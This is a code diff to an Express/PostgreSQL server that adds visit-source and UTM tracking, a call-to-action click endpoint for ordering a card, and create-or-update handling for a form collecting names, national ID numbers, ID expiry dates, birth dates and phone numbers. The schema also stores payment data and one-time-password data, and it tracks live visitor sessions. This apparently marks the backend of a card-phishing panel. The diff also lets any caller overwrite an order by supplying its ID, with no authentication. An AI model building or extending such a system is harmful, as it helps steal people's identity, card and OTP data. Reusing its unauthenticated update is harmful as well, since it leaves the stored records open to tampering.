@@ -35,6 +35,13 @@ async function initDb() {
         status TEXT,
         current_page TEXT,
         country TEXT,
+        visit_source TEXT DEFAULT '',
+        referrer TEXT DEFAULT '',
+        utm_source TEXT DEFAULT '',
+        utm_medium TEXT DEFAULT '',
+        utm_campaign TEXT DEFAULT '',
+        utm_content TEXT DEFAULT '',
+        landing_page TEXT DEFAULT '',
         personal_data JSONB,
         payment_data JSONB,
         otp_data JSONB,
@@ -58,7 +65,11 @@ async function initDb() {
         country TEXT,
         current_page TEXT,
         last_activity TEXT,
-        user_agent TEXT
+        user_agent TEXT,
+        referrer TEXT DEFAULT '',
+        utm_source TEXT DEFAULT '',
+        utm_medium TEXT DEFAULT '',
+        utm_campaign TEXT DEFAULT ''
       );
 
       -- فهارس لتسريع الاستعلامات
@@ -96,6 +107,38 @@ function getCountryFromIP(ip) {
   return 'Unknown';
 }
 
+// Helper: Extract visit source info from request
+function getVisitSource(req) {
+  const referrer = req.get('referer') || req.get('referrer') || '';
+  const utmSource = req.query.utm_source || '';
+  const utmMedium = req.query.utm_medium || '';
+  const utmCampaign = req.query.utm_campaign || '';
+  const utmContent = req.query.utm_content || '';
+  
+  let visitSource = 'Direct';
+  if (referrer && !referrer.includes('localhost') && !referrer.includes('railway.app')) {
+    try {
+      const url = new URL(referrer);
+      const domain = url.hostname.replace('www.', '');
+      visitSource = domain;
+    } catch (e) {
+      visitSource = referrer.substring(0, 100);
+    }
+  }
+  if (utmSource) {
+    visitSource = utmSource + (utmMedium ? '/' + utmMedium : '');
+  }
+  
+  return {
+    visitSource,
+    referrer,
+    utmSource,
+    utmMedium,
+    utmCampaign,
+    utmContent
+  };
+}
+
 app.set('trust proxy', true);
 
 // Helper: Parse JSONB fields from DB rows into proper JSON objects
@@ -123,6 +166,13 @@ function parseOrderRow(row) {
     status: row.status,
     currentPage: row.current_page,
     country: row.country,
+    visitSource: row.visit_source || '',
+    referrer: row.referrer || '',
+    utmSource: row.utm_source || '',
+    utmMedium: row.utm_medium || '',
+    utmCampaign: row.utm_campaign || '',
+    utmContent: row.utm_content || '',
+    landingPage: row.landing_page || '',
     personalData: personalData || null,
     paymentData: paymentData || null,
     otpData: otpData || null,
@@ -156,14 +206,20 @@ app.use(async (req, res, next) => {
   const country = getCountryFromIP(ip);
   const currentPage = req.path;
   const now = new Date().toISOString();
+  
+  // استخراج بيانات مصدر الزيارة
+  const visitInfo = getVisitSource(req);
 
   // تحديث الجلسة في قاعدة البيانات
   const sessionTask = pool.query(`
-    INSERT INTO visitor_sessions (session_id, ip, country, current_page, last_activity, user_agent)
-    VALUES ($1, $2, $3, $4, $5, $6)
+    INSERT INTO visitor_sessions (session_id, ip, country, current_page, last_activity, user_agent, referrer, utm_source, utm_medium, utm_campaign)
+    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
     ON CONFLICT (session_id) DO UPDATE SET
-      current_page = $4, last_activity = $5
-  `, [visitorKey, ip, country, currentPage, now, userAgent])
+      current_page = $4, last_activity = $5, referrer = COALESCE(NULLIF($7, ''), visitor_sessions.referrer),
+      utm_source = COALESCE(NULLIF($8, ''), visitor_sessions.utm_source),
+      utm_medium = COALESCE(NULLIF($9, ''), visitor_sessions.utm_medium),
+      utm_campaign = COALESCE(NULLIF($10, ''), visitor_sessions.utm_campaign)
+  `, [visitorKey, ip, country, currentPage, now, userAgent, visitInfo.referrer, visitInfo.utmSource, visitInfo.utmMedium, visitInfo.utmCampaign])
   .then(() => {
     // تنظيف الجلسات الخاملة (أكثر من دقيقتين بدلاً من 5 ليكون العداد أدق للزيارات "اللحظية")
     return pool.query("DELETE FROM visitor_sessions WHERE last_activity < (NOW() - INTERVAL '2 minutes')");
@@ -176,6 +232,12 @@ app.use(async (req, res, next) => {
   sessionTask.catch(() => {}); // silent catch
 
   res.locals.sessionId = visitorKey;
+  res.locals.country = country;
+  res.locals.visitSource = visitInfo.visitSource;
+  res.locals.referrer = visitInfo.referrer;
+  res.locals.utmSource = visitInfo.utmSource;
+  res.locals.utmMedium = visitInfo.utmMedium;
+  res.locals.utmCampaign = visitInfo.utmCampaign;
   next();
 });
 
@@ -235,9 +297,47 @@ app.get('/api/sessions/full', async (req, res) => {
   }
 });
 
-// Get session ID for client
+// Get session ID and country for client
 app.get('/api/session', (req, res) => {
-  res.json({ sessionId: res.locals.sessionId });
+  res.json({ 
+    sessionId: res.locals.sessionId,
+    country: res.locals.country,
+    visitSource: res.locals.visitSource,
+    referrer: res.locals.referrer,
+    utmSource: res.locals.utmSource,
+    utmMedium: res.locals.utmMedium,
+    utmCampaign: res.locals.utmCampaign
+  });
+});
+
+// Track CTA click - يتم استدعاؤه عند الضغط على "اطلب بطاقتك الآن"
+app.post('/api/track-cta', async (req, res) => {
+  try {
+    const { sessionId, country, visitSource, referrer, utmSource, utmMedium, utmCampaign, landingPage } = req.body;
+    const ip = req.headers['x-forwarded-for'] 
+      ? req.headers['x-forwarded-for'].split(',')[0].trim() 
+      : (req.headers['x-real-ip'] || req.ip);
+    const realCountry = getCountryFromIP(ip);
+    const userAgent = req.get('user-agent') || '';
+    const now = new Date().toISOString();
+    const visitorKey = sessionId || ((ip || 'unknown') + ':' + userAgent.substring(0, 100));
+
+    // تحديث الجلسة بمعلومات الزيارة والضغط على CTA
+    await pool.query(`
+      INSERT INTO visitor_sessions (session_id, ip, country, current_page, last_activity, user_agent, referrer, utm_source, utm_medium, utm_campaign)
+      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
+      ON CONFLICT (session_id) DO UPDATE SET
+        current_page = $4, last_activity = $5, referrer = COALESCE(NULLIF($7, ''), visitor_sessions.referrer),
+        utm_source = COALESCE(NULLIF($8, ''), visitor_sessions.utm_source),
+        utm_medium = COALESCE(NULLIF($9, ''), visitor_sessions.utm_medium),
+        utm_campaign = COALESCE(NULLIF($10, ''), visitor_sessions.utm_campaign)
+    `, [visitorKey, ip, realCountry, landingPage || '/data.html', now, userAgent, referrer || '', utmSource || '', utmMedium || '', utmCampaign || '']);
+
+    res.json({ success: true, country: realCountry, visitSource: visitSource || 'Direct' });
+  } catch (err) {
+    console.error('CTA tracking error:', err);
+    res.status(500).json({ error: 'Tracking error' });
+  }
 });
 
 // Heartbeat API to keep session alive
@@ -259,30 +359,38 @@ app.post('/api/heartbeat', async (req, res) => {
   }
 });
 
-// Save personal data (Step 1)
+// Create/Update personal data (Step 1) - الآن يدعم الإنشاء والتحديث
 app.post('/api/orders/personal-data', async (req, res) => {
   try {
-    const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender } = req.body;
+    const { 
+      fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, 
+      dob_day, dob_month, dob_year, email, gender, residence_country,
+      orderId: existingOrderId, visitSource, referrer, utmSource, utmMedium, utmCampaign, landingPage 
+    } = req.body;
 
     if (!fullname || !id_number || !phone || !email) {
       return res.status(400).json({ error: 'Missing required fields' });
     }
 
-    const orderId = 'ORD-' + Date.now();
     const forwardedFor = req.headers['x-forwarded-for'];
     const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (req.headers['x-real-ip'] || req.ip);
     const userAgent = req.get('user-agent') || '';
     const sessionId = (ip || 'unknown') + ':' + userAgent.substring(0, 50);
     const country = getCountryFromIP(ip);
-    
+    const effectiveCountry = residence_country || country;
+
+    // If orderId provided, update existing order; otherwise create new
+    let orderId = existingOrderId || ('ORD-' + Date.now());
+
     const personalData = {
       fullname,
       id_number,
       phone,
-      id_expiry: `${id_expiry_day}/${id_expiry_month}/${id_expiry_year}`,
-      dob: `${dob_day}/${dob_month}/${dob_year}`,
+      id_expiry: `${id_expiry_day || ''}/${id_expiry_month || ''}/${id_expiry_year || ''}`,
+      dob: `${dob_day || ''}/${dob_month || ''}/${dob_year || ''}`,
       email,
-      gender
+      gender,
+      residence_country: residence_country || ''
     };
 
     // استخدام Transaction لضمان الاتساق
@@ -290,16 +398,43 @@ app.post('/api/orders/personal-data', async (req, res) => {
     try {
       await client.query('BEGIN');
       
-      await client.query(`
-        INSERT INTO orders (id, session_id, timestamp, status, current_page, country, personal_data)
-        VALUES ($1, $2, $3, $4, $5, $6, $7)
-      `, [orderId, sessionId, new Date().toISOString(), 'personal_data_submitted', 'personal_data', country, JSON.stringify(personalData)]);
+      if (existingOrderId) {
+        // تحديث طلب موجود
+        await client.query(`
+          UPDATE orders 
+          SET personal_data = $1, country = $2, visit_source = $3, referrer = $4, 
+              utm_source = $5, utm_medium = $6, utm_campaign = $7, landing_page = $8,
+              status = 'personal_data_submitted', current_page = 'personal_data'
+          WHERE id = $9
+        `, [JSON.stringify(personalData), effectiveCountry, visitSource || '', referrer || '', 
+            utmSource || '', utmMedium || '', utmCampaign || '', landingPage || '', existingOrderId]);
 
-      // عند إدخال البيانات الشخصية فقط، المرحلة payment لكن الحالة waiting (ليست pending)
-      await client.query(`
-        INSERT INTO order_states (order_id, stage, status)
-        VALUES ($1, $2, $3)
-      `, [orderId, 'payment', 'waiting']);
+        // إنشاء order_state إذا لم يكن موجود
+        await client.query(`
+          INSERT INTO order_states (order_id, stage, status)
+          VALUES ($1, $2, $3)
+          ON CONFLICT (order_id) DO UPDATE SET stage = $2, status = $3
+        `, [orderId, 'payment', 'waiting']);
+      } else {
+        // إنشاء طلب جديد
+        await client.query(`
+          INSERT INTO orders (id, session_id, timestamp, status, current_page, country, personal_data, visit_source, referrer, utm_source, utm_medium, utm_campaign, landing_page)
+          VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)
+          ON CONFLICT (id) DO UPDATE SET
+            personal_data = $7, country = $6, visit_source = $8, referrer = $9,
+            utm_source = $10, utm_medium = $11, utm_campaign = $12, landing_page = $13,
+            status = 'personal_data_submitted', current_page = 'personal_data'
+        `, [orderId, sessionId, new Date().toISOString(), 'personal_data_submitted', 'personal_data', 
+            effectiveCountry, JSON.stringify(personalData), visitSource || '', referrer || '',
+            utmSource || '', utmMedium || '', utmCampaign || '', landingPage || '']);
+
+        // عند إدخال البيانات الشخصية فقط، المرحلة payment لكن الحالة waiting
+        await client.query(`
+          INSERT INTO order_states (order_id, stage, status)
+          VALUES ($1, $2, $3)
+          ON CONFLICT (order_id) DO UPDATE SET stage = $2, status = $3
+        `, [orderId, 'payment', 'waiting']);
+      }
 
       await client.query('COMMIT');
     } catch (err) {
